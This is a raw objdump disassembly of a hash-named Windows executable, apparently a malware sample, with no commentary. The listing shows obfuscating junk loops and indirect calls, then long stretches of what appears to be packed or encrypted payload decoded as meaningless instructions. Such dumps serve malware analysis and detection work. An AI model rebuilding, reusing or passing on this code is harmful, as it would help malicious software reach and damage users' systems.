
85caed91e288166bdee352bb8626a99176eee58f5eabf1c83abf17afcabff445.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	arpl   sp,cx
  4012f5:	push   ebp
  4012f6:	data16 jo 0x401369
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	inc    esp
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	pop    edx
  4013a8:	mov    bl,0x51
  4013aa:	cdq    
  4013ab:	xchg   esi,eax
  4013ac:	stos   DWORD PTR es:[edi],eax
  4013ad:	pop    esp
  4013ae:	fistp  DWORD PTR [ecx-0x79c11091]
  4013b4:	push   edx
  4013b5:	or     dh,BYTE PTR [eax-0x50]
  4013b8:	in     al,0xc2
  4013ba:	dec    ebx
  4013bb:	and    al,0x31
  4013bd:	mov    ?,edi
  4013bf:	int    0xd3
  4013c1:	imul   esp,edi,0x3a
  4013c4:	xchg   ebx,ebx
  4013c6:	add    eax,DWORD PTR [edx+ecx*8]
  4013c9:	and    esi,DWORD PTR [ebp+0x60969901]
  4013cf:	adc    dl,BYTE PTR ds:0x7b740383
  4013d5:	hlt    
  4013d6:	jl     0x401399
  4013d8:	cwde   
  4013d9:	nop
  4013da:	add    DWORD PTR [ebx+ebp*2+0x3b9daafd],ecx
  4013e1:	mov    bh,0x38
  4013e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013e4:	call   0xaa21:0xb406057c
  4013eb:	sub    BYTE PTR [eax],ah
  4013ed:	mov    dl,0x19
  4013ef:	(bad)  
  4013f0:	retf   0xbe61
  4013f3:	sar    DWORD PTR [eax],0x9a
  4013f6:	shl    DWORD PTR ds:0x324fb276,cl
  4013fc:	(bad)  [edi]
  4013fe:	mov    bl,0x8b
  401400:	mov    ah,0x96
  401403:	outs   dx,BYTE PTR ds:[esi]
  401404:	sbb    eax,0x68e90ebf
  401409:	sub    DWORD PTR ds:0x4b3a902f,esp
  40140f:	mov    BYTE PTR [esi],cl
  401411:	out    dx,al
  401412:	nop
  401413:	push   eax
  401414:	in     eax,dx
  401415:	mov    bl,0x4d
  401417:	lds    ebp,FWORD PTR [edi+0x1f]
  40141a:	call   0x2bea:0x5e96c901
  401421:	not    DWORD PTR [ebp+0x5a7629e0]
  401427:	mov    bl,0xf
  401429:	sub    DWORD PTR [eax],0xffffffb3
  40142c:	push   ds
  40142d:	push   0x4ceecae4
  401432:	imul   esi,DWORD PTR [ecx-0x6e],0x6fa5a6f4
  401439:	into   
  40143a:	xchg   ebx,eax
  40143b:	mov    DWORD PTR [ecx+0x599a51],eax
  401441:	lock ss ja 0x401400
  401445:	scas   eax,DWORD PTR es:[edi]
  401446:	mov    al,ds:0x150d6ad
  40144b:	pop    ebp
  40144c:	out    dx,al
  40144d:	into   
  40144e:	imul   DWORD PTR [ebx+eax*8-0xf1ba40a]
  401455:	leave  
  401456:	(bad)  
  401457:	mov    bl,0x21
  401459:	popf   
  40145a:	pop    ds
  40145b:	and    DWORD PTR [ebp-0x491731d3],ecx
  401461:	(bad)  
  401462:	repnz push ds
  401464:	pop    ebx
  401465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401466:	scas   al,BYTE PTR es:[edi]
  401467:	pop    es
  401468:	mov    ecx,0x1882a06c
  40146d:	aam    0x9e
  40146f:	pop    ecx
  401470:	pop    ebx
  401471:	xor    eax,0x6a251dc3
  401476:	push   esi
  401477:	arpl   WORD PTR [eax-0x10],di
  40147a:	dec    ecx
  40147b:	aam    0x98
  40147d:	std    
  40147e:	scas   eax,DWORD PTR es:[edi]
  40147f:	push   cs
  401480:	popa   
  401481:	inc    ebx
  401482:	mov    cl,0x77
  401484:	xor    ch,BYTE PTR [ebp+eiz*8-0x2d]
  401488:	mov    WORD PTR [ecx*2-0x313bf1b4],ds
  40148f:	jge    0x401454
  401491:	cdq    
  401492:	aaa    
  401493:	mov    esi,edx
  401495:	aam    0x9e
  401497:	mov    eax,ebp
  401499:	pop    ebx
  40149a:	ds or  BYTE PTR cs:[ebx],ch
  40149e:	dec    esp
  40149f:	ror    BYTE PTR [ebp+0x7e],1
  4014a2:	stos   BYTE PTR es:[edi],al
  4014a3:	lock mov ds:0x8849b97,eax
  4014a9:	loopne 0x4014ec
  4014ab:	dec    ebp
  4014ac:	jle    0x401513
  4014ae:	sar    dl,1
  4014b0:	icebp  
  4014b1:	lds    ebp,FWORD PTR [esi+eax*1+0x5395a0eb]
  4014b8:	out    dx,eax
  4014b9:	sub    BYTE PTR [edx],bh
  4014bb:	test   eax,0xd44106c7
  4014c0:	inc    edx
  4014c1:	inc    DWORD PTR [esi]
  4014c3:	jae    0x40150a
  4014c5:	cs cmp dl,0xc7
  4014c9:	sub    esp,DWORD PTR [edx+eax*4]
  4014cc:	stc    
  4014cd:	call   0x5564f5a4
  4014d2:	rcl    edi,0x3c
  4014d5:	sbb    BYTE PTR [esi+0x62],0xb6
  4014d9:	imul   esp,DWORD PTR [edx+0x21],0x30
  4014dd:	and    eax,0x5ae778a9
  4014e2:	mov    ebp,0xf2486057
  4014e7:	mov    al,ds:0xa25e7d94
  4014ec:	out    dx,al
  4014ed:	or     al,0x88
  4014ef:	mov    ds:0xa2d3a581,al
  4014f4:	pop    ecx
  4014f5:	pop    ebp
  4014f6:	xor    ch,bl
  4014f8:	test   DWORD PTR [ebx+0x52],esi
  4014fb:	or     BYTE PTR [ebx-0x76996b75],al
  401501:	inc    ebp
  401502:	cld    
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x63c4e013]
  401516:	pop    ebp
  401517:	(bad)  
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	and    eax,0x1b49561c
  401525:	bound  esp,QWORD PTR [ecx]
  401527:	push   0xdc503911
  40152c:	add    DWORD PTR [eax],edi
  40152e:	rol    esp,cl
  401530:	jge    0x401520
  401532:	pop    ds
  401533:	outs   dx,DWORD PTR ds:[esi]
  401534:	mov    bh,0x6a
  401536:	in     al,dx
  401537:	jl     0x4014c1
  401539:	cs add eax,0xf5775ab1
  40153f:	and    eax,0x63a7bce9
  401544:	stc    
  401545:	in     al,dx
  401546:	loop   0x40154e
  401548:	(bad)  
  401549:	or     eax,0x78a46b0c
  40154e:	push   esp
  40154f:	(bad)  
  401550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401551:	push   es
  401552:	clc    
  401553:	retf   0x3291
  401556:	mov    ah,0x6d
  401558:	retf   0xa942
  40155b:	in     eax,dx
  40155c:	add    al,0xd9
  40155e:	xor    edx,DWORD PTR [eax+0x27]
  401561:	rcr    DWORD PTR [eax-0x42425571],0xf9
  401568:	sbb    ebp,DWORD PTR [eax-0x35114a75]
  40156e:	jp     0x4015a7
  401570:	ss jle 0x401583
  401573:	jmp    FWORD PTR [ebp+0x2551ec4a]
  401579:	(bad)  
  40157a:	cmp    eax,DWORD PTR [edx-0x1f]
  40157d:	add    eax,0xf8aa212a
  401582:	mov    al,ds:0x868c365c
  401587:	sti    
  401588:	icebp  
  401589:	fwait
  40158a:	mov    ebp,0x1088294
  40158f:	dec    ebp
  401590:	repz popf 
  401592:	push   esi
  401593:	sbb    al,0xc2
  401595:	fisubr DWORD PTR [ecx+0x1c3a3103]
  40159b:	ret    0x32ed
  40159e:	mov    ah,0x4a
  4015a0:	or     DWORD PTR [ecx+0x103a9ad4],esi
  4015a6:	lock rcl esp,0xa1
  4015aa:	mov    cl,0x68
  4015ac:	add    dh,BYTE PTR [edx+0x13ee3c4e]
  4015b2:	add    cl,dh
  4015b4:	add    ch,ch
  4015b6:	xchg   edx,eax
  4015b7:	loope  0x401608
  4015b9:	xor    eax,DWORD PTR [ecx]
  4015bb:	cmp    al,0x8e
  4015bd:	lods   al,BYTE PTR ds:[esi]
  4015be:	xchg   edi,eax
  4015bf:	ins    DWORD PTR es:[edi],dx
  4015c0:	cmp    esi,DWORD PTR [edi]
  4015c2:	in     al,0x81
  4015c4:	outs   dx,BYTE PTR ds:[esi]
  4015c5:	out    dx,eax
  4015c6:	ss leave 
  4015c8:	cmp    bl,dl
  4015ca:	popf   
  4015cb:	pop    esp
  4015cc:	xchg   al,al
  4015ce:	lock fcomp QWORD PTR [esi+0x2b770bd9]
  4015d5:	and    eax,DWORD PTR ds:0xcff4d088
  4015db:	cmp    eax,0x5d50e3f8
  4015e0:	inc    esi
  4015e1:	fldenv [ecx+0x48]
  4015e4:	in     al,0x7b
  4015e6:	lahf   
  4015e7:	imul   DWORD PTR [ebx]
  4015e9:	fcmovb st,st(5)
  4015eb:	push   ebx
  4015ec:	stos   DWORD PTR es:[edi],eax
  4015ed:	jnp    0x401635
  4015ef:	push   ebx
  4015f0:	mov    bl,BYTE PTR [esi-0x58]
  4015f3:	mov    edx,0x77535807
  4015f8:	sbb    eax,0x17451e5d
  4015fd:	jns    0x401672
  4015ff:	cli    
  401600:	jne    0x401635
  401602:	or     cl,ah
  401604:	aam    0x28
  401606:	pop    ds
  401607:	(bad)  
  401608:	cwde   
  401609:	mov    ecx,0x72aab7ce
  40160e:	cdq    
  40160f:	aaa    
  401610:	sbb    ecx,eax
  401612:	xchg   esi,eax
  401613:	push   edi
  401614:	and    BYTE PTR [edi+ecx*2],0xdf
  401618:	jo     0x4015a0
  40161a:	mov    eax,ds:0xc2f26ab4
  40161f:	inc    ebp
  401620:	call   FWORD PTR [ecx]
  401622:	scas   al,BYTE PTR es:[edi]
  401623:	fstp   DWORD PTR [edi]
  401625:	dec    eax
  401626:	mov    bh,0x65
  401628:	mov    al,ds:0x4c4fadee
  40162d:	icebp  
  40162e:	xacquire xchg DWORD PTR ds:0xde881c40,esi
  401635:	into   
  401636:	lods   al,BYTE PTR ds:[esi]
  401637:	inc    edx
  401638:	gs sahf 
  40163a:	cmp    eax,0xe29869c
  40163f:	jmp    ecx
  401641:	je     0x40168d
  401643:	mov    ecx,0x32c797ec
  401648:	cwde   
  401649:	inc    esi
  40164a:	and    BYTE PTR [edi-0x36],cl
  40164d:	repnz dec ebx
  40164f:	repz pop ds
  401651:	add    BYTE PTR [eax],ah
  401653:	or     esp,0xfffffffa
  401656:	jae    0x40164f
  401658:	sbb    dl,BYTE PTR [ecx-0x2b]
  40165b:	je     0x4016da
  40165d:	mov    ah,BYTE PTR [eax+0x7a1a4cba]
  401663:	sbb    edx,DWORD PTR [ebx-0x44]
  401666:	ret    0x96e2
  401669:	mov    cs,WORD PTR [esi+0x60]
  40166c:	xor    eax,0xffa3c845
  401671:	and    BYTE PTR es:[ebx],0xe2
  401675:	pop    ss
  401676:	add    DWORD PTR [ebx],ebx
  401678:	or     ch,BYTE PTR [ebp+0x2f]
  40167b:	xor    ebx,edi
  40167d:	lea    ecx,[ebp-0x5b390b5c]
  401683:	adc    ebx,edx
  401685:	cs mov bh,0x40
  401688:	mov    esi,0x9a94a75e
  40168d:	jmp    0x386c:0x9c9f20ee
  401694:	jecxz  0x401660
  401696:	leave  
  401697:	sar    BYTE PTR [eax+0x12],cl
  40169a:	popa   
  40169b:	hlt    
  40169c:	hlt    
  40169d:	jae    0x4016d2
  40169f:	das    
  4016a0:	jns    0x4016e9
  4016a2:	xchg   esi,eax
  4016a3:	add    DWORD PTR [ebp-0x2d190ac],eax
  4016a9:	scas   eax,DWORD PTR es:[edi]
  4016aa:	lock push ds
  4016ac:	fs push cs
  4016ae:	mov    ebp,0x683ddb59
  4016b3:	ds push esi
  4016b5:	fstp   st(4)
  4016b7:	shl    BYTE PTR [edx],cl
  4016b9:	outs   dx,BYTE PTR ds:[esi]
  4016ba:	scas   eax,DWORD PTR es:[edi]
  4016bb:	fmul   QWORD PTR [eax-0x34]
  4016be:	imul   eax,DWORD PTR [esi-0x374cff19],0xdfb9f6b2
  4016c8:	push   edi
  4016c9:	js     0x40167d
  4016cb:	mov    edx,0xce1fbae3
  4016d0:	out    dx,eax
  4016d1:	pusha  
  4016d2:	stos   BYTE PTR es:[edi],al
  4016d3:	popf   
  4016d4:	btr    DWORD PTR [ebp+0x13f2513],edi
  4016db:	into   
  4016dc:	add    DWORD PTR [ebp-0x7b],edx
  4016df:	stc    
  4016e0:	hlt    
  4016e1:	mov    fs,WORD PTR [edx]
  4016e3:	sub    esi,DWORD PTR [esi+0x1c]
  4016e6:	mov    edi,0x83978758
  4016eb:	jae    0x4016b3
  4016ed:	cwde   
  4016ee:	and    ch,BYTE PTR [esi-0x36]
  4016f1:	mov    dl,0x3f
  4016f3:	sbb    al,0xd5
  4016f5:	mov    esp,ecx
  4016f7:	add    ebx,DWORD PTR [ebx]
  4016f9:	mov    WORD PTR [edi+0x2b],?
  4016fc:	test   DWORD PTR [edx+0x6c2d699],edi
  401702:	imul   esp,DWORD PTR [edx-0x4bc2519e],0x37
  401709:	(bad)  
  40170b:	cmp    bh,0x88
  40170e:	shl    BYTE PTR [ebx+0x6a2a93e7],0x6c
  401715:	arpl   bp,cx
  401717:	loope  0x4016b9
  401719:	and    al,BYTE PTR [ebp-0x72]
  40171c:	(bad)  
  40171d:	mov    eax,0x458dd89e
  401722:	ror    BYTE PTR [ecx+0x458bcc45],1
  401728:	fmul   DWORD PTR [ecx+0x458dd445]
  40172e:	call   0x42301c
  401733:	add    BYTE PTR [ebp-0x31],cl
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	or     dh,BYTE PTR [edx]
  401742:	aad    0x87
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	xlat   BYTE PTR ds:[ebx]
  40174d:	inc    eax
  40174e:	out    0x54,eax
  401750:	in     eax,dx
  401751:	es xor al,0xb3
  401754:	call   0x85a457ed
  401759:	xchg   ebx,eax
  40175a:	inc    ebp
  40175b:	sub    al,0x8d
  40175d:	pop    eax
  40175e:	ins    BYTE PTR es:[edi],dx
  40175f:	adc    eax,0xbaa4f2b9
  401764:	mov    al,0x4
  401766:	sbb    DWORD PTR [edi-0x785a43ce],edx
  40176c:	pop    ss
  40176d:	call   0xaa8:0xf2ddca74
  401774:	sub    eax,0xe6962bf
  401779:	xlat   BYTE PTR ds:[ebx]
  40177a:	sub    BYTE PTR [ebp+0x2a],ch
  40177d:	dec    ebx
  40177e:	sbb    al,0xc1
  401780:	fwait
  401781:	xchg   DWORD PTR [eax+eiz*4-0x2d8b60e4],edi
  401788:	imul   eax,edi,0xe863d472
  40178e:	mov    ebx,0xda2401d2
  401793:	jo     0x4017c1
  401795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401796:	loopne 0x401801
  401798:	sub    ebp,DWORD PTR [ebp+0x28]
  40179b:	push   ebx
  40179c:	mov    edx,0x2597df04
  4017a1:	es ss dec ebx
  4017a4:	rcr    DWORD PTR [edi-0x31],cl
  4017a7:	push   edx
  4017a8:	outs   dx,DWORD PTR ds:[esi]
  4017a9:	jle    0x4017ad
  4017ab:	iret   
  4017ac:	sbb    eax,0x461678a4
  4017b1:	ret    
  4017b2:	out    dx,al
  4017b3:	jge    0x40182f
  4017b5:	loop   0x4017f3
  4017b7:	loop   0x401785
  4017b9:	rcr    DWORD PTR [ecx+edx*2],0x11
  4017bd:	xor    eax,0x6ecce2e7
  4017c2:	mov    al,0xb9
  4017c4:	cmc    
  4017c5:	pop    es
  4017c6:	daa    
  4017c7:	stc    
  4017c8:	cs pop ebp
  4017cb:	and    BYTE PTR [ebx],cl
  4017cd:	or     al,0x5e
  4017cf:	dec    edx
  4017d0:	add    ebp,DWORD PTR [edi-0x1a]
  4017d3:	call   0xc8ae8a62
  4017d8:	ret    0x9dea
  4017db:	in     al,dx
  4017dc:	adc    edx,DWORD PTR [eax+eiz*4]
  4017df:	lock pop ds
  4017e1:	test   al,0xa7
  4017e3:	add    al,0xd7
  4017e5:	push   es
  4017e6:	aad    0x47
  4017e8:	sub    dl,dl
  4017ea:	push   eax
  4017eb:	mov    cl,0x4f
  4017ed:	add    DWORD PTR [ecx+0x48d2cf3e],esp
  4017f3:	sbb    al,0x79
  4017f5:	mov    es,WORD PTR [edi-0x74]
  4017f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017f9:	push   edx
  4017fa:	(bad)
  4017fd:	ror    ah,cl
  4017ff:	dec    edi
  401800:	test   BYTE PTR [esi+ebx*1+0x7a],ch
  401804:	ds push 0x18
  401807:	dec    ebp
  401808:	lea    edi,[ecx+ebx*8+0x870e80d]
  40180f:	test   al,0x87
  401811:	pop    eax
  401812:	lahf   
  401813:	inc    esi
  401814:	mov    eax,0xc78f9e36
  401819:	sbb    eax,esp
  40181b:	sub    eax,0x21a60a1d
  401820:	into   
  401821:	xor    eax,DWORD PTR [edx-0x56]
  401824:	sbb    esi,edx
  401826:	fisttp QWORD PTR [edx+0x460c40a2]
  40182c:	mov    eax,0x9603994a
  401831:	inc    ebp
  401832:	lods   eax,DWORD PTR ds:[esi]
  401833:	lods   al,BYTE PTR ds:[esi]
  401834:	cs fs out dx,al
  401837:	inc    ecx
  401838:	ss dec ebp
  40183a:	adc    eax,0xb8735b5e
  40183f:	adc    BYTE PTR [edi-0x64],cl
  401842:	ds xor eax,0x5cec6863
  401848:	xor    DWORD PTR [eax+0xa9af843],0xffffff8c
  40184f:	add    bl,0x19
  401852:	xor    DWORD PTR [ebp+0x55],ebp
  401855:	loop   0x4018d5
  401857:	popa   
  401858:	push   ebx
  401859:	ins    DWORD PTR es:[edi],dx
  40185a:	xlat   BYTE PTR ds:[ebx]
  40185b:	sar    DWORD PTR [ecx],cl
  40185d:	dec    ecx
  40185e:	xchg   edi,eax
  40185f:	mov    dl,0xe1
  401861:	test   BYTE PTR [edx-0x68],dl
  401864:	dec    ebp
  401865:	mov    bh,BYTE PTR [edi+0x38]
  401868:	mov    esp,0x3e2a624d
  40186d:	stos   DWORD PTR es:[edi],eax
  40186e:	pop    esi
  40186f:	inc    edx
  401870:	xor    ebp,DWORD PTR [eax+0x6e]
  401873:	mov    ebx,DWORD PTR [ebx]
  401875:	xchg   edi,eax
  401876:	push   edi
  401877:	inc    ebp
  401878:	scas   al,BYTE PTR es:[edi]
  401879:	or     BYTE PTR [eax-0x2d],al
  40187c:	ficomp DWORD PTR [edx+0x26e42ea3]
  401882:	push   ax
  401884:	in     al,0xcb
  401886:	mov    ebp,0xa9b900a
  40188b:	shl    bh,cl
  40188d:	mov    ds:0x8e696076,eax
  401892:	add    eax,0x7ff5c1e2
  401897:	push   edi
  401898:	mov    cl,BYTE PTR [ebp+0x45]
  40189b:	mov    esi,0xed2118a4
  4018a0:	inc    edi
  4018a1:	jmp    0x4018ae
  4018a3:	jp     0x401825
  4018a5:	cwde   
  4018a6:	cmp    dh,BYTE PTR [ebp+0xb7b560e]
  4018ac:	add    ah,BYTE PTR ds:[ecx]
  4018af:	jmp    0xd98594a2
  4018b4:	jmp    0x401863
  4018b6:	push   ecx
  4018b7:	and    ecx,DWORD PTR [eax+ebp*1-0x74]
  4018bb:	add    al,0xf6
  4018bd:	push   edx
  4018be:	pop    ebx
  4018bf:	dec    esi
  4018c0:	mov    edx,0xd9ad3796
  4018c5:	lahf   
  4018c6:	mov    edi,esi
  4018c8:	fcomp  QWORD PTR [ebp+0x7e]
  4018cb:	push   esp
  4018cc:	enter  0xaa89,0x7e
  4018d0:	cdq    
  4018d1:	and    eax,DWORD PTR [ebp+0x46]
  4018d4:	clc    
  4018d5:	fsub   QWORD PTR [edi+0x74b6feff]
  4018db:	retf   
  4018dc:	mov    dh,0x26
  4018de:	and    al,0xce
  4018e0:	pushf  
  4018e1:	iret   
  4018e2:	xchg   esp,eax
  4018e3:	ret    0xc360
  4018e6:	push   0x24
  4018e8:	sbb    esi,DWORD PTR [edi+0x70838d44]
  4018ee:	mov    ds:0x25d0115a,al
  4018f3:	or     al,0x4e
  4018f5:	cmp    BYTE PTR [ebx-0x5d701af7],bh
  4018fb:	rcl    DWORD PTR ds:0x84c8de30,1
  401901:	popf   
  401902:	mov    bh,BYTE PTR [edx-0x25]
  401905:	cmp    eax,ebx
  401907:	mov    ah,0x91
  401909:	mov    ebp,0x10580dba
  40190e:	je     0x4018db
  401910:	je     0x40197e
  401912:	icebp  
  401913:	repz daa 
  401915:	mov    ds:0x8a827fa4,eax
  40191a:	jnp    0x401982
